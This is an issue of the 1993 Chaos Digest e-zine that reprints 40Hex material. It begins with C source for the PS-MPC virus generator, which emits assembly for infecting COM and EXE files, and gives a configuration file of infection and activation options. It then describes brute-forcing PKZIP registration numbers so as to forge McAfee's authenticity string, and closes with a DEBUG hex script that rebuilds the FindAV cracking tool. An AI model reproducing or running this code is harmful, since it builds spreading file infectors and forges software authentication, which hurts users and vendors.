    sprintf(b,"mov  byte ptr [bp+numinfec],%u",config.maxinfect);
    print(b,"reset infection counter");
    printblank();
  }
  print("mov  ah,1Ah","Set new DTA");
  print("lea  dx,[bp+newDTA]","new DTA @ DS:DX");
  print("int  21h","");
  printblank();
  addheap("newDTA","db 43 dup (?)","Temporary DTA");
  if (config.p.traverse == DOT_DOT)
  {
    print("mov  ah,47h","Get current directory");
    print("mov  dl,0","Current drive");
    print("lea  si,[bp+origdir]","DS:SI->buffer");
    print("int  21h","");
    print("mov  byte ptr [bp+backslash],'\\'","Prepare for later CHDIR");
    addheap("origdir","db 64 dup (?)","Current directory buffer");
    addheap("backslash","db ?","");
    printblank();
  }
  if (config.p.int24)
  {
    addheap("oldint24","dd ?","Storage for old int 24h handler");
    print("mov  ax,3524h","Get int 24 handler");
    print("int  21h","to ES:BX");
    print("mov  word ptr [bp+oldint24],bx","Save it");
    print("mov  word ptr [bp+oldint24+2],es","");
    print("mov  ah,25h","Set new int 24 handler");
    print("lea  dx,[bp+offset int24]","DS:DX->new handler");
    print("int  21h","");
    print("push cs","Restore ES");
    print("pop  es","'cuz it was changed");
    printblank();
  }
}

void restore_EXE(void)
{
  print("push ds","");
  print("push es","");
  print("push cs","DS = CS");
  print("pop  ds","");
  print("push cs","ES = CS");
  print("pop  es","");
  print("lea  si,[bp+jmpsave2]","");
  print("lea  di,[bp+jmpsave]","");
  print("movsw","");
  print("movsw","");
  print("movsw","");
  if (!config.p.infectCOM)
    print("movsw","");
}

void restore_COM(void)
{
  print("lea  si,[bp+save3]","");
  print("mov  di,100h","");
  print("push di","For later return");
  if (!config.p.infectEXE)
    print("movsw","");
  print("movsb","");
}
----------------------------------- Cut Here --------------------------------

------------------------------

End of Chaos Digest #1.65
************************************

Chaos Digest              Jeudi 1er Juillet 1993        Volume 1 : Numero 66
                              ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.66 (1er Juillet 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #001(3)-003 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #001(3)-003 (reprint)


/* FILE: VSUBS.C */
#include "vheader.h"

void code_subroutines(void)
{
  printlabel("open:","");
  print("mov  ah,3dh","");
  print("lea  dx,[bp+newDTA+30]","filename in DTA");
  print("int  21h","");
  print("xchg ax,bx","");
  print("ret","");
  printblank();
  printlabel("attributes:","");
  print("mov  ax,4301h","Set attributes to cx");
  print("lea  dx,[bp+newDTA+30]","filename in DTA");
  print("int  21h","");
  print("ret","");
  printblank();
  if (config.p.encrypt)
  {
    printlabel("write:","");
    print("pop  bx","Restore file handle");
    print("pop  bp","Restore relativeness");
    print("mov  ah,40h","Write to file");
    print("lea  dx,[bp+decrypt]","Concatenate virus");
    print("mov  cx,heap-decrypt","# bytes to write");
    print("int  21h","");
    print("push bx","");
    print("push bp","");
    printlabel("endwrite:","");
    printblank();
  }
  if (config.p.int24)
  {
    printlabel("int24:","New int 24h (error) handler");
    print("mov  al,3","Fail call");
    print("iret","Return control");
    printblank();
  }
}
----------------------------------- Cut Here --------------------------------
/* FILE: VTAIL.C */
#include "vheader.h"

void code_tail(void)
{
  if (config.p.infectCOM)
    printlabel("end       entry_point","");
  else
    if (config.p.encrypt)
      printlabel("end       decrypt","");
    else
      printlabel("end       startvirus","");
}
----------------------------------- Cut Here -------------------------------
/* FILE: VTRAVEL.C */
#include "vheader.h"

void code_traversal_generic(void);
void dot_dot(void);
void lea_exe(void);
void lea_com(void);

void code_traversal(void)
{
  config.p.calls_check = 0;
  switch (config.p.traverse)
  {
    case NONE:    code_traversal_generic(); break;
    case DOT_DOT: printlabel("dir_scan:","\"dot dot\" traversal");
                  code_traversal_generic();
                  dot_dot();
                  break;
  }
  printblank();
  printlabel("done_infections:","");
}

void code_traversal_generic(void)
{
  if (config.p.infectEXE) {
    lea_exe();
    if (!config.p.infectCOM)
      code_check();
  }
  if (config.p.infectCOM) {
    lea_com();
    if (config.p.infectEXE)
      config.p.calls_check++;
    else
      code_check();
  }
}

void lea_exe(void)
{
  print("lea  dx,[bp+exe_mask]","");
  if (config.p.infectCOM)
    print("call infect_mask","");
}

void lea_com(void)
{
  print("lea  dx,[bp+com_mask]","");
  if (config.p.infectEXE)
    print("call infect_mask","");
}

void dot_dot(void)
{
  print("mov  ah,3bh","change directory");
  print("lea  dx,[bp+dot_dot]","\"cd ..\"");
  print("int  21h","");
  print("jnc  dir_scan","go back for mo!");
}
----------------------------------- Cut Here --------------------------------
/* FILE: VVAR.C */
#include "vheader.h"

void code_variables(void)
{
  if (config.p.infectEXE) addvar("exe_mask","db '*.exe',0","");
  if (config.p.infectCOM) addvar("com_mask","db '*.com',0","");
  if (config.p.traverse == DOT_DOT)
    addvar("dot_dot","db '..',0","");
}
----------------------------------- Cut Here --------------------------------
;FILE: SKELETON.CFG
;Skeleton configuration file for PS-MPC version 0.90a
;Lines beginning with semicolons denote comments

;Required parameters:

;Filename = 
;This is the filename to be generated by PS-MPC as the source code file.
Filename = target.asm

;Infect = (C,E)
;COM, EXE
;Note: You can mix the two, a la "Infect = C,E"  Do not use a space to
;      deliminate the two parameters.
Infect = C,E

;Optional parameters - Defaults are shown in square brackets

;Traversal = 
;([None], Dot Dot)
;If None is specified, then only the files in the current directory will be
;infected.  If Dot dot is specified, then files in the current directory and
;subdirectories below the current will be infected.
Traversal = N

;Encrypted = 
;(Yes, [No])
;Only turn off encryption if you wish to limit the size of the virus.
Encryption = Y

;IDWord = XX
;([  ],XX)
;The IDWord consists of two characters which are used to identify already
;infected EXE files.  This line is not needed in COM-only infectors.  Do
;not use an apostrophe or the source code will not assemble properly.
IDWord = DA

;MinSize = #
;(A,[0]..65535)
;MinSize is used only in the infection of COM files.  Files under MinSize
;bytes are not infected.  MinSize = 0 turns off this option.  MinSize = A
;indicates use of the virus's effective length as the minimum size.  This
;line is ignored in EXE-specific infectors.
MinSize = 0

;MaxSize = #
;(A,[0]..65535)
;MaxSize is used only in the infection of COM files.  Files above MaxSize
;bytes are not infected.  MaxSize = 0 turns off this option.  MaxSize = A
;indicates automatic calculation of maximum size. This line is not needed
;in EXE-only infectors.
MaxSize = A

;Infections = #
;([0]..255)
;Infections is an optional counter limiting the number of infections per run
;of the virus to a specific number.  Infections = 0 disables this option.
Infections = 0

;ErrorHandler = 
;(Yes, [No])
;ErrorHandler selects if you wish to include a short critical error handler
;in the virus.  This handler prevents Abort, Retry, Fail messages by taking
;over the critical error interrupt.  Attempted infection of files on write-
;protected diskettes will not generate an error if this option is set.
ErrorHandler = Y

;CommandCom = 
;(Yes, [No])
;This flag indicates whether you wish the virus to infect COMMAND.COM
;'Yes' turns off the check for COMMAND.COM, thus saving space.
CommandCom = N

;VirusName = 
;The only limitation to the string is that you may not use both the single
;and double quotes together in the string, i.e. the string B'li"p is not
;legal.
VirusName = [Skeleton]

;AuthorName = 
;The same constraints apply to AuthorName.
AuthorName = Deke

;AllowZero = 
;(Yes, [No])
;This flags whether the virus will allow an encryption value of 0, which
;would effectively leave it in an unencrypted state.  'Yes' disables the
;zero check, thereby shortening code length.
AllowZero = N

;Activation Conditions
;All conditions must be satisfied for activation to occur

;Always = 
;(Yes, [No])
;This flags whether the virus always activates, although I can't imagine a
;useful virus that does so.
;Always = N

;IfMonth = #
;<1..12><-,+>
;Activate if the month is equal to the specified number.  Adding a minus sign
;after the month indicates activation before or during the specified month.
;Adding a plus sign after the month indicates activation during or after the
;specified month.
;IfMonth = 11+       ;Activate in either November or December

;IfDay = #
;<1..31><-,+>
;Activate if the date is on a certain date  Adding a minus sign after the day
;indicates activation on or before that day.  Similarly, adding a plus sign
;indicates activation on or after that day. Note: the program does not check
;to see if the number inputted is a valid date.  For example, combining
;IfMonth=2 and IfDay=30+ will NOT result in an error, although the virus will
;clearly never activate.
;IfDay = 15+         ;Activate after the fifteenth of the month

;IfYear = #
;<0..65535><-,+>
;Activate during a certain year or years.  Don't be stupid and put a
;ridiculous year such as 1-.
;IfYear = 1993+      ;Activate after 1993

;IfDOW = #
;<0..6><-,+>
;0 = Sunday, 1 = Monday, etc.
;Activate on, before, or after a particular day of the week.
;IfDOW = 0           ;Activate only on Sundays

;IfMonthDay = #,#
;<#,#><-,+>
;Activate on, before, or after a particular day of the year.  This differs
;from the combination of IfMonth and IfDay.
;IfMonthDay = 5,9+   ;Activate only after May 9th
;compare to:
;IfMonth = 5+        ;Activate in May through December, but only if the
;IfDay   = 9+        ;day is on or after the 8th.  July 1st is NOT an
                     ;activation date

;IfHour = #
;<0..23><-,+>
;This should be self-explanatory at this point.
;IfHour = 12         ; Activate any time from 12 noon -> 1 P.M.

;IfMinute = #
;<0..59><-,+>
;Duh.
;IfMinute = 30+

;IfSecond = #
;<0..59><-,+>  ;; check 0
;This is somewhat useless, in my estimation
;IfSecond = 30+

;Percentage = #
;<1..99>
;This uses the 1/100 second counter as a random number.  If the counter is
;less than the percentage, then the virus will activate.
;Percentage = 50      ; Even odds
-------------------------------- Stop Cutting -------------------------------

+++++

40Hex Number 8 Volume 2 Issue 4                                      File 002

-=-=-=-=-=-=-
                Eat PUTAV
                  by Demogorgon of PHALCON/SKISM
-=-=-=-=-=-=-


     Even though pk-zip 2.0 will be out soon and all the methods in
this article will be obsolete, I decided to write about them anyway.  I
am sure you are familiar with the old program called makeav, which
attempted to brute force hack pkzip registration serial numbers.  Sure,
it worked, but it was quite slow.  Then, Hal released the program
findav, which did the same task several thousand times faster.  Dark
Angel took apart the program findav in order to make a few
modifications.  Naturally, Hal included several routines in his code in
order to make it very difficult to take apart.  Dark Angel captured a
memory image of findav after it loaded into memory, wrote it back to
disk as a com file, and then changed all of the offsets so that all
references to the data segment were changed to their address in the code
segment.  Dark Angel made several modifications, the most important of
which was so that findav would not quit out after finding a serial
number.  The new version finds every serial number, and logs them to
disk.

-=-=-=-=-=-=-
        An Experiment in Distributed Processing
-=-=-=-=-=-=-

     The next day, Garbageheap and I took the modified findav down to
the nearest university.  We started it running on twenty 80386 systems
on their network, each working on a different segment of the 4 billion
possible serial numbers.  The goal was to find every serial number that
worked for McAfee Associates, so that we could then determine which one
was the one he uses.  When an authenticity verified pkzip file is
extracted, pkunzip generates a 3 letter, 3 number validation string that
is dependent on the serial number used to validate it.  A single
registration name has millions of valid serial numbers, but each of
these serial numbers has one unique validation string.
 For Example:

PKUNZIP (R)    FAST!    Extract Utility    Version 1.1    03-15-90
Copr. 1989-1990 PKWARE Inc. All Rights Reserved. PKUNZIP/h for help
PKUNZIP Reg. U.S. Pat. and Tm. Off.

Searching ZIP: EARLOBE.ZIP
  Exploding: NUL           -AV

Authentic files Verified!   # ATU314   Zip Source: McAFEE ASSOCIATES
                              ^^^^^^

PKUNZIP (R)    FAST!    Extract Utility    Version 1.1    03-15-90
Copr. 1989-1990 PKWARE Inc. All Rights Reserved. PKUNZIP/h for help
PKUNZIP Reg. U.S. Pat. and Tm. Off.

Searching ZIP: EARLOBE.ZIP
  Exploding: NUL           -AV

Authentic files Verified!   # SXQ414   Zip Source: McAFEE ASSOCIATES
                              ^^^^^^

     Therefore, the task was to find which of the serial numbers we had
found for McAfee produces the validation string "NWN405".  To do this,
we ran every serial number through a program called checkav which Dark
Angel wrote to determine what validation number corresponds to which
serial number.  Of course, a task like this would be nearly impossible
on your machine at home, but thanks to my local university, we were able
to use twenty machines at once.


-=-=-=-=-=-=-
        Yet Another Way To Eat PUTAV
-=-=-=-=-=-=-
     Because there is never only one way to do something, I decided to
put in another way to get whatever validation string you want out of
pkzip.  All you need to do is include some ^H characters in your
registration name to backspace over the validation string and create a
new one.  Naturally, you can not enter ^H characters when you run
putav, so you enter the correct number of some other character, go
into memory with td, and change them to 08h, the ^H character.  That
way, when pkunzip runs and gives you a validation string, it will
backspace over it and show your own.  For example:

>>>>> PUTAV.EXE

PUTAV - Put Authenticity Verification in PKZIP.EXE
Copyright 1990 PKWARE, Inc.  All rights reserved.

Enter company name exactly as it appears on the PKWARE documentation.
Company Name : ^A^A^A^A^A^A^A^A^A^A^A# BOB666   Earlobe industries
Enter serial number exactly as it appears on the PKWARE documentation.
Serial Number: 23453244

>>>>>

     After typing earlobe industries and hitting return, break into
turbo debug and change the ^A's (01) to ^H's (08).  Remember to put in
11 backspaces.  You can use the same method to find the serial number for
your string with findav.

     The only useful application of all this is to duplicate an existing
pkzip registration.  You could do that before, but now you can do it
better.  Changing the validation string only really makes a difference
if you are trying to duplicate an archive that is known to have a certain
one, like McAfee's.

+++++

40Hex Number 8 Volume 2 Issue 4                                     File 003


             -=PHALCON/SKISM=- Presents FindAv P/S Style!
                 PD War Collection Program 2
                      By Hal Of Pheonix
                      Modified by: Dark Angel of PHALCON/SKISM

FindAV version 1.5
Released 27 Jul 92
By Dark Angel of PHALCON/SKISM

In the beginning, there was MakeAV and all its counterparts.  These programs
used a brute-force approach to find PKZIP serial numbers.  They ran PUTAV,
PKZIP, and PKUNZIP repeatedly until a legitimate serial number was found.
Although they worked, these programs required hours, often days of running, as
well as much wear and tear on the hard drive head.  Then FindAV was released
by HAL of PHOENIX.

FindAV was many, many times faster than MakeAV.  Instead of running the PKWare
files over and over again, FindAV used an algorithmic approach similar to the
one used by PKWare when calculating serial numbers for registered clients.  It
was a marvelous program, but it, too, had its limitations.  The continual
display of numbers was aesthetically pleasing, but it took much valuable
processor time, slowing down the search for the holy serial number.  E-FindAV
was released, once again speeding the search time by a large factor.  E-FindAV
monitored the running of FindAV, turning off the display until the serial
number was found.  This was a tremendous improvement.  However, the user had
to sit through a tedious, lengthy, entirely unecessary introduction screen
before E-FindAV would execute FindAV. This was unacceptable.  Additionally,
E-FindAV failed to fix some fundamental problems with FindAV.

For one, FindAV stopped after finding the first serial number.  While this is
fine for most people, it is not desirable when finding existing serial
number/validation string combinations.  Second, FindAV had a few bugs.  The
first bug occured only in 386 mode.  FindAV would "miss" some legitimate
serial numbers which it would catch in 8086 mode.  This was, once again,
undesirable when looking for existing serial number/validation string
combinations.  FindAV would also run into an infinite loop in certain
instances in 8086 mode.  This, too, was unacceptable.  Third, FindAV would not
log the serial numbers found in a file. Thus, the user had to manually copy
the number onto a sheet of paper and transfer it to a file for later
reference.  Fourth, FindAV would not let the user start searching for a serial
number from any number except 1000.  If the user wished to find starting from,
say, 2 billion, he or she would be forced to create a MAKEAV.DAT file and
hex-edit the appropriate values.  Last, both FindAV and E-FindAV used
rudimentary disassembly-proof code which precluded users from adding features
to the program.

FindAV version 1.5 fixes these problems.  It is essentially the same program
as the originally released version by HAL of PHOENIX, but with all the fixes
and enhancements mentioned above.

Command line options:
/B - begin at number
You can now start the search from any number, be it 0, 4,294,967,295 or
anything in between.  This serves several purposes.  Should the data file be
corrupted, it is not necessary to hexedit the data file to restart from the
last position.  This option also facilitates the coordinated running of FindAV
on multiple machines.  In this manner, each machine can start the search at a
different point.  The value following the /B overrides the value in the
FindAV.DAT data file.

Syntax:
        FindAV /B ###
Example:
        FindAV /B 478293

/S - supress output
Searches may be expedited somewhat with this supress output option.  This
eliminates the unecessary on-screen reporting of a sucessful finding.  Logging
via the AVS.DAT file is preserved.  The 'D'isplay command continues to
function
under this mode.

Syntax:
        FindAV /S

Valid keystrokes in FindAV:
ESC - Terminate calculation
Pressing the ESC key causes FindAV to terminate after saving the status of the
run in FindAV.DAT.

'D' - Display
Pressing the 'D' key causes FindAV to display the current search number on the
screen.  This function was originally part of the main loop.  However, it
consumed countless clock cycles, so it was eliminated to save precious time.

Files created by FindAV 1.5:
AVS.DAT - log file
The AVS.DAT file is created by FindAV.  FindAV uses this file to record all
sucessful serial number finds.  It consists of the company name followed by
multiple lines of serial numbers. If FindAV detects the file in the directory,
it will append serial numbers to the end.

FINDAV.DAT - save file
The FindAV.DAT file is created by FindAV when the user terminates calculation.
It contains the company name as well as the current search number.  It is
useful when the user does not wish to search an entire range in one running.
FindAV will automatically resume operation if it detects FindAV in the current
directory.  FindAV 1.5 has data file compatability with version 1.0.

Revision history:
1.0 - Unknown - HAL of PHOENIX
    - initial release

1.5 - 27 Jul 92 - Dark Angel of PHALCON/SKISM
    - Bug fixes, peephole optimisation, log file, nonstop action, anynumber
      begin.
-----------------------------------------------------------------------------
n findav15.com
e 0100  E8 B8 02 74 03 E8 09 00 E8 01 04 B4 4C CD 21 6C
e 0110  01 E8 44 01 75 0F E8 D5 00 BA D9 06 E8 27 04 E8
e 0120  5F 00 E8 84 00 E8 13 00 72 10 BF 06 06 2E FF 16
e 0130  0F 01 73 DD BA F2 06 E8 0C 04 C3 B4 01 CD 16 74
e 0140  1E 2A E4 CD 16 3C 64 74 13 3C 44 74 0F 3C 1B 75
e 0150  0E BA 61 07 E8 EF 03 E8 F1 03 F9 C3 E8 1F 00 F8
e 0160  C3 66 83 3D FF 74 15 66 FF 05 F8 C3 8B 05 8B 55
e 0170  02 40 75 03 42 74 05 AB 92 AB F8 C3 F9 C3 E8 6D
e 0180  00 E8 5F 00 BA AD 07 E8 BC 03 C3 B8 01 3D BA 7B
e 0190  08 CD 21 93 C3 BA D5 07 E8 AB 03 E9 6A FF B4 40
e 01A0  BA D0 07 B9 02 00 CD 21 C3 E8 DF FF 73 1B B4 3C
e 01B0  33 C9 CD 21 72 DF E8 D2 FF B4 40 8A 0E 13 06 B5
e 01C0  00 BA 14 06 CD 21 E8 D5 FF B8 02 42 33 C9 99 CD
e 01D0  21 B4 40 B9 0B 00 BA B5 07 CD 21 E8 C0 FF B4 3E
e 01E0  CD 21 C3 B4 02 32 FF 8B 16 49 06 CD 10 C3 FD BF
e 01F0  BF 07 B9 0A 00 80 3E 05 06 00 74 24 66 A1 06 06
e 0200  66 BB 0A 00 00 00 66 33 D2 66 0B C0 75 06 B0 20
e 0210  F3 AA FC C3 66 F7 F3 92 04 30 AA 92 E2 E8 FC C3
e 0220  88 0E C2 07 A1 06 06 8B 16 08 06 EB 06 8B 46 02
e 0230  8B 56 04 0B C0 75 08 0B D2 75 04 B0 20 EB 10 6A
e 0240  0A 52 50 E8 3C 01 89 4E 04 89 46 02 92 04 30 AA
e 0250  FE 0E C2 07 75 D7 FC C3 E8 3E 01 E8 D8 00 75 07
e 0260  E8 05 00 75 02 32 C0 C3 BF 0A 06 C7 06 C1 07 00
e 0270  0A 80 3E 05 06 00 74 24 66 8B 05 66 C1 C8 10 66
e 0280  B9 0A 00 00 00 66 0B C0 74 50 66 33 D2 66 F7 F1
e 0290  00 16 C1 07 FE 0E C2 07 75 EB EB 3E C7 45 04 9A
e 02A0  3B C7 45 06 00 CA FF 75 04 FF 75 06 FF 35 FF 75
e 02B0  02 E8 2C 00 6A 0A 52 50 E8 C7 00 00 16 C1 07 B8
e 02C0  0A 00 99 52 50 FF 75 04 FF 75 06 E8 12 00 89 55
e 02D0  04 89 45 06 FE 0E C2 07 75 CC 80 3E C1 07 3E C3
e 02E0  55 8B EC 8B 4E 0A E3 38 8B 5E 08 8B 56 06 8B 46
e 02F0  04 D1 E9 D1 DB D1 EA D1 D8 0B C9 75 F4 F7 F3 8B
e 0300  F0 F7 66 0A 91 8B 46 08 F7 E6 03 D1 72 0C 3B 56
e 0310  06 77 07 72 06 3B 46 04 76 01 4E 33 D2 96 EB 12
e 0320  8B 4E 08 8B 46 06 33 D2 F7 F1 8B 5E 04 93 F7 F1
e 0330  8B D3 5D C2 08 00 B9 07 00 BB 9D 00 BF 0A 06 EB
e 0340  1E 80 3E 05 06 00 74 17 66 D3 0D 66 8B 05 66 33
e 0350  D2 F7 F3 66 C1 C8 10 66 83 E8 1A F7 F3 EB 20 8B
e 0360  15 8B 45 02 8B F0 D1 EE D1 DA D1 D8 E2 F8 89 15
e 0370  89 45 02 2D 1A 00 83 DA 00 53 52 50 E8 03 00 0B
e 0380  D2 C3 55 8B EC 8B 5E 08 8B 46 06 33 D2 F7 F3 8B
e 0390  4E 04 91 F7 F3 5D C2 06 00 BE 06 06 AD 89 44 02
e 03A0  AD 89 44 02 BE 14 06 32 ED 8A 0E 13 06 33 DB AC
e 03B0  30 87 0A 06 43 80 E3 03 E2 F5 C3 BA 4B 06 E8 85
e 03C0  01 E8 48 01 E8 0A 02 E8 22 00 E8 D4 00 80 3E 13
e 03D0  06 00 75 03 E8 5B 01 33 F6 E8 37 01 80 3E 13 06
e 03E0  00 75 08 BA 41 07 E8 5D 01 32 C0 C3 BE 81 00 AC
e 03F0  3C 0D 74 37 3C 2F 75 F7 AC E8 86 00 3C 53 75 13
e 0400  B8 90 00 BF 19 01 B9 09 00 F3 AA BA 83 08 E8 35
e 0410  01 EB DC 3C 42 74 15 3C 3F 75 05 BA 0E 09 EB 5D
e 0420  A2 0A 09 BA F6 08 E8 1D 01 EB C4 C3 32 E4 33 DB
e 0430  B9 0A 00 99 AC E8 62 00 74 FA E8 50 00 74 05 BA
e 0440  A3 08 EB 39 50 92 F7 E1 50 93 F7 E1 5B 03 D3 5B
e 0450  03 C3 83 D2 00 93 AC E8 33 00 74 E8 4E 89 1E 06
e 0460  06 89 16 08 06 E8 86 FD BA E2 08 E8 D8 00 BA B3
e 0470  07 E8 D2 00 BA D2 07 E8 CC 00 E9 72 FF E8 C6 00
e 0480  CD 20 3C 61 7C 06 3C 7A 7F 02 04 E0 C3 3C 30 7C
e 0490  08 3C 39 7F 04 2C 30 3A C0 C3 3C 20 74 02 3C 3D
e 04A0  C3 E8 D3 00 72 65 BA 51 08 E8 9A 00 B9 05 00 E8
e 04B0  DA 00 72 54 8B F2 AD 3D 41 56 75 46 AD 3D 31 30
e 04C0  75 40 BA 14 06 8A 0C E8 C2 00 72 3C 83 3E 08 06
e 04D0  00 75 12 81 3E 06 06 E8 03 75 0A BA 06 06 B1 04
e 04E0  E8 A9 00 72 1D AC A2 13 06 98 91 BE 14 06 BF 31
e 04F0  08 F3 A4 B8 0D 0A AB B0 24 AA BA 21 08 E8 46 00
e 0500  EB 06 BA 31 08 E8 3E 00 E8 78 00 C3 BE 01 00 E8
e 0510  01 00 C3 E8 11 00 B4 01 0B F6 75 05 80 CD 20 EB
e 0520  03 80 E5 DF CD 10 C3 B4 03 32 FF CD 10 89 16 49
e 0530  06 C3 BA 98 07 E8 0E 00 B4 0A BA 12 06 CD 21 BA
e 0540  D0 07 E8 01 00 C3 B4 09 CD 21 C3 E8 6C 00 72 26
e 0550  BF 4B 06 B8 41 56 AB B8 31 30 AB BE 13 06 AC AA
e 0560  98 8B C8 F3 A4 BE 06 06 A5 A5 04 09 91 BA 4B 06
e 0570  E8 31 00 E8 0D 00 C3 B8 00 3D BA C3 07 CD 21 A3
e 0580  CE 07 C3 B4 3E 8B 1E CE 07 CD 21 C3 B4 3F 8B 1E
e 0590  CE 07 CD 21 72 06 3B C1 75 02 F8 C3 BA 06 08 E8
e 05A0  A4 FF F9 C3 B4 40 8B 1E CE 07 CD 21 73 0B 3B C1
e 05B0  74 07 BA EE 07 E8 8E FF F9 C3 B4 3C 33 C9 BA C3
e 05C0  07 CD 21 73 08 BA D5 07 E8 7B FF F9 C3 A3 CE 07
e 05D0  C3 9C 58 25 FF 0F 50 9D 9C 58 25 00 F0 3D 00 F0
e 05E0  74 22 9C 58 0D 00 70 50 9D 9C 58 25 00 70 3D 00
e 05F0  70 75 11 FE 06 05 06 2E C7 06 0F 01 61 01 BA 2E
e 0600  07 E8 42 FF C3 00 E8 03 00 00 00 00 00 00 00 00
e 0610  00 00 34 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0640  00 00 00 00 00 00 00 00 00 00 00 50 72 6F 67 72
e 0650  61 6D 20 74 6F 20 66 69 6E 64 20 73 65 72 69 61
e 0660  6C 20 23 20 66 6F 72 20 41 56 20 20 76 65 72 20
e 0670  31 2E 35 0D 0A 76 65 72 20 31 2E 30 20 3C 20 62
e 0680  79 20 48 41 4C 20 66 6F 72 20 50 48 4F 45 4E 49
e 0690  58 20 3E 0D 0A 76 65 72 20 31 2E 35 20 62 79 20
e 06A0  44 61 72 6B 20 41 6E 67 65 6C 20 6F 66 20 50 48
e 06B0  41 4C 43 4F 4E 2F 53 4B 49 53 4D 0D 0A 50 72 65
e 06C0  73 73 20 45 53 43 20 74 6F 20 65 78 69 74 20 70
e 06D0  72 6F 67 72 61 6D 0D 0A 24 0D 0A 53 65 72 69 61
e 06E0  6C 20 6E 75 6D 62 65 72 20 66 6F 75 6E 64 21 0D
e 06F0  0A 24 0D 0A 46 69 6E 64 41 56 20 63 6F 6D 70 6C
e 0700  65 74 65 64 2E 20 20 4E 6F 20 6D 6F 72 65 20 73
e 0710  65 72 69 61 6C 20 6E 75 6D 62 65 72 73 20 6D 61
e 0720  79 20 62 65 20 66 6F 75 6E 64 2E 0D 0A 24 33 38
e 0730  36 20 43 50 55 20 64 65 74 65 63 74 65 64 0D 0A
e 0740  24 4E 6F 20 69 6E 70 75 74 2C 20 61 62 6F 72 74
e 0750  69 6E 67 20 6F 70 65 72 61 74 69 6F 6E 21 0D 0A
e 0760  24 0D 0A 45 53 43 20 6B 65 79 20 64 65 74 65 63
e 0770  74 65 64 2C 20 73 61 76 69 6E 67 20 46 49 4E 44
e 0780  41 56 2E 44 41 54 20 61 6E 64 20 65 78 69 74 69
e 0790  6E 67 2E 2E 2E 0D 0A 24 45 6E 74 65 72 20 63 6F
e 07A0  6D 70 61 6E 79 20 6E 61 6D 65 3A 20 24 54 72 79
e 07B0  69 6E 67 20 23 20 20 20 20 20 20 20 20 20 20 20
e 07C0  24 00 00 46 49 4E 44 41 56 2E 44 41 54 00 00 00
e 07D0  0D 0A 0D 0A 24 0D 0A 45 72 72 6F 72 20 63 72 65
e 07E0  61 74 69 6E 67 20 66 69 6C 65 21 0D 0A 24 0D 0A
e 07F0  45 72 72 6F 72 20 77 72 69 74 69 6E 67 20 66 69
e 0800  6C 65 21 0D 0A 24 0D 0A 45 72 72 6F 72 20 69 6E
e 0810  20 72 65 61 64 69 6E 67 20 66 69 6C 65 21 0D 0A
e 0820  24 43 6F 6E 74 69 6E 75 69 6E 67 20 66 6F 72 3A
e 0830  20 42 61 64 20 66 69 6C 65 20 68 65 61 64 65 72
e 0840  20 69 6E 20 46 49 4E 44 41 56 2E 44 41 54 0D 0A
e 0850  24 46 49 4E 44 41 56 2E 44 41 54 20 64 65 74 65
e 0860  63 74 65 64 2C 20 72 65 61 64 69 6E 67 20 69 6E
e 0870  20 64 61 74 61 2E 2E 2E 0D 0A 24 41 56 53 2E 44
e 0880  41 54 00 53 75 70 70 72 65 73 73 69 6F 6E 20 6F
e 0890  66 20 6F 75 74 70 75 74 20 61 63 74 69 76 65 2E
e 08A0  0D 0A 24 46 61 74 61 6C 20 65 72 72 6F 72 20 69
e 08B0  6E 20 70 61 72 61 6D 65 74 65 72 20 42 45 47 49
e 08C0  4E 2E 0D 0A 50 72 6F 70 65 72 20 75 73 61 67 65
e 08D0  3A 20 2F 42 20 23 23 23 23 23 23 23 23 23 23 0D
e 08E0  0A 24 42 65 67 69 6E 6E 69 6E 67 20 73 65 61 72
e 08F0  63 68 20 61 74 24 55 6E 6B 6E 6F 77 6E 20 70 61
e 0900  72 61 6D 65 74 65 72 3A 20 2F 00 0D 0A 24 50 61
e 0910  72 61 6D 65 74 65 72 73 20 61 72 65 3A 0D 0A 2F
e 0920  3F 20 20 20 20 20 20 20 20 20 20 44 69 73 70 6C
e 0930  61 79 20 74 68 69 73 20 73 63 72 65 65 6E 0D 0A
e 0940  2F 42 20 23 23 23 23 23 20 20 20 20 42 65 67 69
e 0950  6E 20 61 74 20 23 23 23 23 23 0D 0A 2F 53 20 20
e 0960  20 20 20 20 20 20 20 20 73 75 70 70 72 65 73 73
